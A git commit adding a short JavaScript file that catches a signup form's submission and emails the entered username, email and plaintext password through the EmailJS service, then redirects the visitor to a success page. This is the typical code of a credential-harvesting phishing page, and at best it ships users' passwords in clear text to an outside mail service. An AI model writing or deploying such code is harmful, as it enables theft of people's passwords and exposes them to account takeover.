6002824d7f06b29daf1f80a032b17c6b029abddd
tryredty <aouissifousseni@gmail.com>
2025-04-30 01:59:35 +0200

    Update script.js

---
+++ script.js
@@ -0,0 +1,19 @@
+(function() {
+    emailjs.init("-gVB8zMtb5oVeC5TO"); // Remplacer par votre User ID EmailJS
+  
+    document.getElementById("signup-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+  
+      emailjs.send("default_service", "template_jzyfyjn", {
+        username: this.username.value,
+        email: this.email.value,
+        password: this.password.value
+      })
+      .then(() => {
+        window.location.href = "succes.html";
+      }, (error) => {
+        alert("Erreur d'envoi: " + error.text);
+      });
+    });
+  })();
+  
